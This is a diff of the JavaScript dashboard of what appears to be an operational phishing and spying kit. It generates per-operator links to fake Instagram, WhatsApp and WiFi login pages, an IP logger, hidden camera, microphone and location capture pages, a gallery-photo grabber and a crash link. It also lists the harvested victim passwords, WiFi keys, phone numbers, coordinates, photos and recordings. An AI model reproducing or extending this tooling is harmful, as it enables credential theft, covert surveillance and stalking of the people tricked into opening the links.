-    document.getElementById('btnIgVideo').onclick = () => genLink('videoonly', true);
-    document.getElementById('btnIgAudio').onclick = () => genLink('audio', true);
-    document.getElementById('btnIgVideoAudio').onclick = () => genLink('videoaudio', true);
-    
-    document.getElementById('btnIpLogger').onclick = () => genHack('ip');
-    document.getElementById('btnWaFake').onclick = () => genHack('wa');
-    document.getElementById('btnWifiFake').onclick = () => genHack('wifi');
-    document.getElementById('btnIgFake').onclick = () => genHack('ig');
-    document.getElementById('btnLocation').onclick = () => genHack('loc');
-    document.getElementById('btnCrash').onclick = () => genHack('crash');
+        document.getElementById('videoDuration').oninput = function() {
+            document.getElementById('durationValue').innerText = this.value + t('secShort');
+        };
+        document.getElementById('igVideoDuration').oninput = function() {
+            document.getElementById('igDurationValue').innerText = this.value + t('secShort');
+        };
+        document.getElementById('langTrBtn').onclick = () => { lang = 'tr'; localStorage.setItem('app_language', lang); applyLang(); };
+        document.getElementById('langArBtn').onclick = () => { lang = 'ar'; localStorage.setItem('app_language', lang); applyLang(); };
 
-    document.getElementById('btnRefreshLoc').onclick = loadLocations;
-    document.getElementById('btnClearLoc').onclick = () => clearColl('locations', 'userId', user?.uid, t('cClearLoc'), loadLocations);
-    document.getElementById('btnRefreshWifi').onclick = loadWifi;
-    document.getElementById('btnClearWifi').onclick = () => clearColl('wifi_logs', 'ownerId', user?.uid, t('cClearWifi'), loadWifi);
-    document.getElementById('btnRefreshAcc').onclick = loadAccounts;
-    document.getElementById('btnClearAcc').onclick = () => clearColl('ig_accounts', 'ownerId', user?.uid, t('cClearAcc'), loadAccounts);
-    
-    document.getElementById('btnRefreshAll').onclick = () => { loadCaptures(); loadAccounts(); loadLocations(); loadWifi(); };
-    document.getElementById('btnClearAll').onclick = () => clearColl('captures', 'userId', user?.uid, t('cClearAll'), loadCaptures);
-    document.getElementById('logoutBtn').onclick = async () => { await signOut(auth); location.href = 'login.html'; };
+        // ============ VERİ YÜKLEME ============
 
-    onAuthStateChanged(auth, (u) => {
-        if (u) { user = u; applyLang(); loadCaptures(); loadAccounts(); loadLocations(); loadWifi(); }
-        else location.href = 'login.html';
-    });
-</script>
+        async function loadCaptures() {
+            if (!user) return;
+            const div = document.getElementById('capturesList');
+            div.innerHTML = `<div class="loading-text"><i class="fa-solid fa-spinner fa-spin"></i> ${t('loading')}</div>`;
+            try {
+                const snap = await getDocs(query(collection(db, "captures"), where("userId", "==", user.uid)));
+                let data = []; let tm = 0;
+                snap.forEach(d => { const x = d.data(); data.push({ id: d.id, ...x }); tm += (x.media?.length || 0); });
+                data.sort((a, b) => (b.unix || 0) - (a.unix || 0));
+                document.getElementById('captureCount').innerText = data.length;
+                document.getElementById('mediaCount').innerText = tm;
+                if (!data.length) { div.innerHTML = `<div class="empty-text"><i class="fa-solid fa-circle-exclamation"></i> ${t('noData')}</div>`; return; }
+                let h = '';
+                for (let it of data) {
+                    const date = new Date(it.timestamp);
+                    let mode = ''; switch(it.mode) { case 'photo': mode = t('photo'); break; case '5photos': mode = t('photos'); break; case 'videoonly': mode = t('video'); break; case 'audio': mode = t('audio'); break; case 'videoaudio': mode = t('va'); break; default: mode = it.mode; }
+                    let mh = '';
+                    for (let m of it.media || []) {
+                        const iv = m.match(/\.(mp4|webm|mov)/i);
+                        if (iv) mh += `<video src="${m}" onclick="openMedia('${m}',true)"></video>`;
+                        else mh += `<img src="${m}" onclick="openMedia('${m}',false)">`;
+                    }
+                    h += `<div class="media-card">
+                        <div class="media-card-header"><span class="media-card-ip"><i class="fa-solid fa-globe"></i> IP: ${it.ip || t('unknown')}</span><span class="media-card-time"><i class="fa-solid fa-skull"></i> ${date.toLocaleString(lang==='ar'?'ar-SA':'tr-TR')} | ${mode} ${it.duration?'('+it.duration+t('secShort')+')':''}</span></div>
+                        <div class="media-strip">${mh}</div>
+                        <div class="media-card-footer">
+                            <button class="btn-download" onclick="downloadAllMedia(${JSON.stringify(it.media||[]).replace(/"/g,'&quot;')})"><i class="fa-solid fa-download"></i> ${t('dlAll')}</button>
+                            <button class="btn-delete" onclick="delCapture('${it.id}')"><i class="fa-solid fa-trash"></i> ${t('del')}</button>
+                        </div></div>`;
+                }
+                div.innerHTML = h;
+            } catch(e) { div.innerHTML = `<div class="error-text"><i class="fa-solid fa-circle-xmark"></i> ${e.message}</div>`; }
+        }
+
+        async function loadAccounts() {
+            if (!user) return;
+            const div = document.getElementById('accountsList');
+            div.innerHTML = `<div class="loading-text"><i class="fa-solid fa-spinner fa-spin"></i> ${t('loading')}</div>`;
+            try {
+                const snap = await getDocs(query(collection(db, "ig_accounts"), where("ownerId", "==", user.uid)));
+                const data = []; snap.forEach(d => data.push({ id: d.id, ...d.data() }));
+                data.sort((a, b) => (b.timestamp||'').localeCompare(a.timestamp||''));
+                if (!data.length) { div.innerHTML = `<div class="empty-text"><i class="fa-solid fa-circle-exclamation"></i> ${t('noAcc')}<span class="empty-desc">${t('noAccD')}</span></div>`; return; }
+                let h = '';
+                for (let a of data) {
+                    h += `<div class="acc-card"><div class="acc-header"><span class="acc-user"><i class="fa-solid fa-user"></i> ${a.username||t('unknown')}</span><span class="acc-time"><i class="fa-solid fa-skull"></i> ${a.timestamp?new Date(a.timestamp).toLocaleString(lang==='ar'?'ar-SA':'tr-TR'):'N/A'}</span></div><div class="acc-row"><i class="fa-solid fa-key"></i> ${t('password')}: <span>${a.password||t('unknown')}</span></div><div class="acc-row"><i class="fa-solid fa-globe"></i> ${t('ip')}: <span>${a.ip||t('unknown')}</span></div></div>`;
+                }
+                div.innerHTML = h;
+            } catch(e) { div.innerHTML = `<div class="error-text">${t('error')}: ${e.message}</div>`; }
+        }
+
+        async function loadLocations() {
+            if (!user) return;
+            const div = document.getElementById('locationsList');
+            div.innerHTML = `<div class="loading-text"><i class="fa-solid fa-spinner fa-spin"></i> ${t('loading')}</div>`;
+            try {
+                const snap = await getDocs(query(collection(db, "locations"), where("userId", "==", user.uid)));
+                const data = []; snap.forEach(d => data.push({ id: d.id, ...d.data() }));
+                data.sort((a, b) => (b.unix||0) - (a.unix||0));
+                if (!data.length) { div.innerHTML = `<div class="empty-text"><i class="fa-solid fa-circle-exclamation"></i> ${t('noLoc')}<span class="empty-desc">${t('noLocD')}</span></div>`; return; }
+                let h = '';
+                for (let l of data) {
+                    h += `<div class="loc-card"><div class="loc-header"><span class="loc-coords"><i class="fa-solid fa-location-dot"></i> ${l.latitude?.toFixed(5)}, ${l.longitude?.toFixed(5)}</span><span class="loc-time"><i class="fa-solid fa-skull"></i> ${l.timestamp?new Date(l.timestamp).toLocaleString(lang==='ar'?'ar-SA':'tr-TR'):'N/A'}</span></div><div class="loc-address"><i class="fa-solid fa-map-pin"></i> ${l.address||t('unknown')}</div><div class="loc-details"><span><i class="fa-solid fa-globe"></i> ${t('ip')}: ${l.ip||t('unknown')}</span><span><i class="fa-solid fa-bullseye"></i> ${t('accuracy')}: ${l.accuracy?l.accuracy+'m':t('unknown')}</span></div><a href="https://www.google.com/maps?q=${l.latitude},${l.longitude}" target="_blank" class="btn-maps"><i class="fa-solid fa-map"></i> ${t('googleMaps')}</a></div>`;
+                }
+                div.innerHTML = h;
+            } catch(e) { div.innerHTML = `<div class="error-text">${t('error')}: ${e.message}</div>`; }
+        }
+
+        async function loadWifi() {
+            if (!user) return;
+            const div = document.getElementById('wifiList');
+            div.innerHTML = `<div class="loading-text"><i class="fa-solid fa-spinner fa-spin"></i> ${t('loading')}</div>`;
+            try {
+                const snap = await getDocs(query(collection(db, "wifi_logs"), where("ownerId", "==", user.uid)));
+                const data = []; snap.forEach(d => data.push({ id: d.id, ...d.data() }));
+                data.sort((a, b) => (b.unix||0) - (a.unix||0));
+                if (!data.length) { div.innerHTML = `<div class="empty-text"><i class="fa-solid fa-circle-exclamation"></i> ${t('noWifi')}<span class="empty-desc">${t('noWifiD')}</span></div>`; return; }
+                let h = '';
+                for (let w of data) {
+                    h += `<div class="wifi-card"><div class="wifi-header"><span class="wifi-ssid"><i class="fa-solid fa-wifi"></i> ${w.ssid||t('unknown')}</span><span class="wifi-time"><i class="fa-solid fa-skull"></i> ${w.timestamp?new Date(w.timestamp).toLocaleString(lang==='ar'?'ar-SA':'tr-TR'):'N/A'}</span></div><div class="wifi-row"><i class="fa-solid fa-phone"></i> ${t('phone')}: <span>${w.phone||t('unknown')}</span></div><div class="wifi-row"><i class="fa-solid fa-key"></i> ${t('wifiPass')}: <span>${w.wifiPassword||t('unknown')}</span></div><div class="wifi-row"><i class="fa-solid fa-globe"></i> ${t('ip')}: <span>${w.ip||t('unknown')}</span></div></div>`;
+                }
+                div.innerHTML = h;
+            } catch(e) { div.innerHTML = `<div class="error-text">${t('error')}: ${e.message}</div>`; }
+        }
+
+        async function loadGallery() {
+            if (!user) return;
+            const div = document.getElementById('galleryList');
+            div.innerHTML = `<div class="loading-text"><i class="fa-solid fa-spinner fa-spin"></i> ${t('loading')}</div>`;
+            try {
+                const snap = await getDocs(query(collection(db, "gallery_hack"), where("ownerId", "==", user.uid)));
+                const data = []; snap.forEach(d => data.push({ id: d.id, ...d.data() }));
+                data.sort((a, b) => (b.unix||0) - (a.unix||0));
+                if (!data.length) { div.innerHTML = `<div class="empty-text"><i class="fa-solid fa-circle-exclamation"></i> ${t('noGallery')}<span class="empty-desc">${t('noGalleryD')}</span></div>`; return; }
+                let h = '';
+                for (let g of data) {
+                    let mh = '';
+                    for (let m of g.photos || []) {
+                        mh += `<img src="${m}" onclick="openMedia('${m}',false)" style="width:55px;height:55px;object-fit:cover;border:2px solid #aa00ff;border-radius:8px;cursor:pointer;flex-shrink:0;">`;
+                    }
+                    h += `<div class="gallery-card"><div class="gallery-header"><span class="gallery-ip"><i class="fa-solid fa-globe"></i> IP: ${g.ip||t('unknown')}</span><span class="gallery-time"><i class="fa-solid fa-skull"></i> ${g.timestamp?new Date(g.timestamp).toLocaleString(lang==='ar'?'ar-SA':'tr-TR'):'N/A'}</span></div><div class="gallery-row"><i class="fa-solid fa-images"></i> ${t('galleryCount')}: <span>${g.photoCount||(g.photos?.length||0)}</span></div><div class="media-strip" style="padding:8px 0;">${mh}</div></div>`;
+                }
+                div.innerHTML = h;
+            } catch(e) { div.innerHTML = `<div class="error-text">${t('error')}: ${e.message}</div>`; }
+        }
+
+        // ============ SİLME ============
+        async function clearColl(coll, field, val, confirmMsg, reloadFn) {
+            if (!user || !confirm(confirmMsg)) return;
+            const snap = await getDocs(query(collection(db, coll), where(field, "==", val)));
+            await Promise.all([...snap.docs].map(d => deleteDoc(doc(db, coll, d.id))));
+            await reloadFn();
+        }
+
+        window.delCapture = async (id) => { if (!confirm(t('cDel'))) return; await deleteDoc(doc(db, "captures", id)); await loadCaptures(); };
+
+        window.downloadAllMedia = async (urls) => {
+            for (let u of urls) {
+                const a = document.createElement('a');
+                a.href = u;
+                a.download = u.split('/').pop()?.split('?')[0] || 'media';
+                a.target = '_blank';
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
+                await new Promise(r => setTimeout(r, 300));
+            }
+        };
+
+        window.openMedia = (url, isVideo) => {
+            currentModalUrl = url;
+            const modal = document.getElementById('modal');
+            const content = document.getElementById('modalContent');
+            const dlBtn = document.getElementById('modalDownloadBtn');
+
+            if (isVideo) content.innerHTML = `<video src="${url}" controls autoplay style="max-width:94%;max-height:88%;border-radius:14px;"></video>`;
+            else content.innerHTML = `<img src="${url}" style="max-width:94%;max-height:88%;border-radius:14px;cursor:default;">`;
+
+            dlBtn.style.display = 'block';
+            dlBtn.onclick = () => {
+                const a = document.createElement('a');
+                a.href = currentModalUrl;
+                a.download = currentModalUrl.split('/').pop()?.split('?')[0] || 'download';
+                a.target = '_blank';
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
+            };
+
+            modal.style.display = 'flex';
+        };
+
+        function closeModal() {
+            document.getElementById('modal').style.display = 'none';
+            document.getElementById('modalContent').innerHTML = '';
+            document.getElementById('modalDownloadBtn').style.display = 'none';
+            currentModalUrl = null;
+        }
+
+        document.getElementById('modal').addEventListener('click', function(e) {
+            if (e.target === this) closeModal();
+        });
+        document.getElementById('modalClose').addEventListener('click', closeModal);
+
+        // ============ LİNK OLUŞTURMA ============
+        function genLink(mode, isIg = false) {
+            if (!user) return;
+            let url = `${BASE}/?mode=${mode}&uid=${user.uid}`;
+            if (['videoonly','videoaudio','audio'].includes(mode)) {
+                url += `&duration=${isIg ? document.getElementById('igVideoDuration').value : document.getElementById('videoDuration').value}`;
+            }
+            if (isIg) url += '&force_chrome=1';
+            const div = isIg ? document.getElementById('outputInsta') : document.getElementById('outputCamera');
+            div.innerHTML = `<i class="fa-solid fa-link"></i> ${t('linkLabel')}: <a href="${url}" target="_blank">${url}</a> <button class="btn-copy" onclick="navigator.clipboard.writeText('${url}')"><i class="fa-solid fa-copy"></i> ${t('copy')}</button>`;
+            if (isIg) div.innerHTML += `<span class="output-note red"><i class="fa-solid fa-circle-info"></i> ${t('instaNote')}</span>`;
+        }
+
+        function genHack(type) {
+            if (!user) return;
+            let url = '', note = '', cls = '';
+            switch(type) {
+                case 'ip': url = `${BASE}/hack/iplogger.html?uid=${user.uid}&redirect=https://google.com`; break;
+                case 'wa': url = `${BASE}/hack/fakewhatsapp.html?uid=${user.uid}`; break;
+                case 'wifi': url = `${BASE}/hack/fake_wifi.html?uid=${user.uid}`; note = t('wifiNote'); cls = 'cyan-link'; break;
+                case 'ig': url = `${BASE}/hack/instagram_login.html?uid=${user.uid}`; break;
+                case 'loc': url = `${BASE}/?mode=location&uid=${user.uid}`; note = t('locNote'); cls = 'cyan-link'; break;
+                case 'gallery':
+                    const count = document.getElementById('galleryCount').value || 10;
+                    url = `${BASE}/hack/gallery.html?uid=${user.uid}&count=${count}`;
+                    note = t('galleryNote') + ` (${count} foto)`;
+                    cls = 'gallery-link';
+                    break;
+                case 'crash': url = `${BASE}/?crash=1`; note = t('crashWarn'); cls = 'crash-link'; break;
+            }
+            document.getElementById('outputHack').innerHTML = `<i class="fa-solid fa-link"></i> ${t('linkLabel')}: <a href="${url}" target="_blank" class="${cls}">${url}</a> <button class="btn-copy" onclick="navigator.clipboard.writeText('${url}')"><i class="fa-solid fa-copy"></i> ${t('copy')}</button>${note?`<span class="output-note ${type==='crash'?'red':type==='gallery'?'purple':'cyan'}"><i class="fa-solid fa-circle-info"></i> ${note}</span>`:''}`;
+        }
+
+        // ============ EVENTLER ============
+        document.getElementById('btnPhoto1').onclick = () => genLink('photo');
+        document.getElementById('btnPhoto5').onclick = () => genLink('5photos');
+        document.getElementById('btnVideo').onclick = () => genLink('videoonly');
+        document.getElementById('btnAudio').onclick = () => genLink('audio');
+        document.getElementById('btnVideoAudio').onclick = () => genLink('videoaudio');
+
+        document.getElementById('btnIgPhoto').onclick = () => genLink('photo', true);
+        document.getElementById('btnIgPhoto5').onclick = () => genLink('5photos', true);
+        document.getElementById('btnIgVideo').onclick = () => genLink('videoonly', true);
+        document.getElementById('btnIgAudio').onclick = () => genLink('audio', true);
+        document.getElementById('btnIgVideoAudio').onclick = () => genLink('videoaudio', true);
+
+        document.getElementById('btnIpLogger').onclick = () => genHack('ip');
+        document.getElementById('btnWaFake').onclick = () => genHack('wa');
+        document.getElementById('btnWifiFake').onclick = () => genHack('wifi');
+        document.getElementById('btnIgFake').onclick = () => genHack('ig');
+        document.getElementById('btnLocation').onclick = () => genHack('loc');
+        document.getElementById('btnGallery').onclick = () => genHack('gallery');
+        document.getElementById('btnCrash').onclick = () => genHack('crash');
+
+        document.getElementById('btnRefreshLoc').onclick = loadLocations;
+        document.getElementById('btnClearLoc').onclick = () => clearColl('locations', 'userId', user?.uid, t('cClearLoc'), loadLocations);
+        document.getElementById('btnRefreshWifi').onclick = loadWifi;
+        document.getElementById('btnClearWifi').onclick = () => clearColl('wifi_logs', 'ownerId', user?.uid, t('cClearWifi'), loadWifi);
+        document.getElementById('btnRefreshAcc').onclick = loadAccounts;
+        document.getElementById('btnClearAcc').onclick = () => clearColl('ig_accounts', 'ownerId', user?.uid, t('cClearAcc'), loadAccounts);
+        document.getElementById('btnRefreshGallery').onclick = loadGallery;
+        document.getElementById('btnClearGallery').onclick = () => clearColl('gallery_hack', 'ownerId', user?.uid, t('cClearGallery'), loadGallery);
+
+        document.getElementById('btnRefreshAll').onclick = () => { loadCaptures(); loadAccounts(); loadLocations(); loadWifi(); loadGallery(); };
+        document.getElementById('btnClearAll').onclick = () => clearColl('captures', 'userId', user?.uid, t('cClearAll'), loadCaptures);
+        document.getElementById('logoutBtn').onclick = async () => { await signOut(auth); location.href = 'login.html'; };
+
+        onAuthStateChanged(auth, (u) => {
+            if (u) { user = u; applyLang(); loadCaptures(); loadAccounts(); loadLocations(); loadWifi(); loadGallery(); }
+            else location.href = 'login.html';
+        });
+
+        // ============ MATRIX ANİMASYONU ============
+        function initMatrix() {
+            const canvas = document.getElementById('matrixCanvas');
+            const ctx = canvas.getContext('2d');
+            function resize() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; }
+            resize();
+            window.addEventListener('resize', resize);
+            const chars = 'ｱｲｳｴｵｶｷｸｹｺｻｼｽｾｿﾀﾁﾂﾃﾄﾅﾆﾇﾈﾉﾊﾋﾌﾍﾎﾏﾐﾑﾒﾓﾔﾕﾖﾗﾘﾙﾚﾛﾜｦﾝ0123456789';
+            const charArray = chars.split('');
+            const fontSize = 13;
+            const columns = Math.floor(canvas.width / fontSize);
+            const drops = [];
+            for (let i = 0; i < columns; i++) drops[i] = Math.floor(Math.random() * -canvas.height / fontSize);
+            function draw() {
+                ctx.fillStyle = 'rgba(6, 8, 15, 0.05)';
+                ctx.fillRect(0, 0, canvas.width, canvas.height);
+                for (let i = 0; i < drops.length; i++) {
+                    const text = charArray[Math.floor(Math.random() * charArray.length)];
+                    const x = i * fontSize;
+                    const y = drops[i] * fontSize;
+                    ctx.fillStyle = `rgba(0, 255, 65, ${Math.random() * 0.4 + 0.2})`;
+                    ctx.font = fontSize + 'px "Fira Code", monospace';
+                    ctx.fillText(text, x, y);
+                    if (y > canvas.height && Math.random() > 0.97) drops[i] = 0;
+                    drops[i]++;
+                }
+            }
+            setInterval(draw, 45);
+        }
+
+        function initParticles() {
+            const colors = ['#00ff41', '#00cc33', '#ff0040', '#ff3366', '#ffffff', '#aa00ff'];
+            for (let i = 0; i < 20; i++) {
+                const particle = document.createElement('div');
+                particle.classList.add('particle');
+                const size = Math.random() * 2.2 + 0.6;
+                particle.style.width = size + 'px';
+                particle.style.height = size + 'px';
+                particle.style.background = colors[Math.floor(Math.random() * colors.length)];
+                particle.style.left = Math.random() * 100 + '%';
+                particle.style.bottom = '0';
+                particle.style.animationDuration = Math.random() * 18 + 10 + 's';
+                particle.style.animationDelay = Math.random() * 15 + 's';
+                particle.style.boxShadow = `0 0 ${size * 4}px ${particle.style.background}`;
+                document.body.appendChild(particle);
+                particle.addEventListener('animationiteration', () => {
+                    particle.style.left = Math.random() * 100 + '%';
+                    particle.style.animationDuration = Math.random() * 18 + 10 + 's';
+                });
+            }
+        }
+
+        initMatrix();
+        initParticles();
+    </script>
 </body>
 </html>
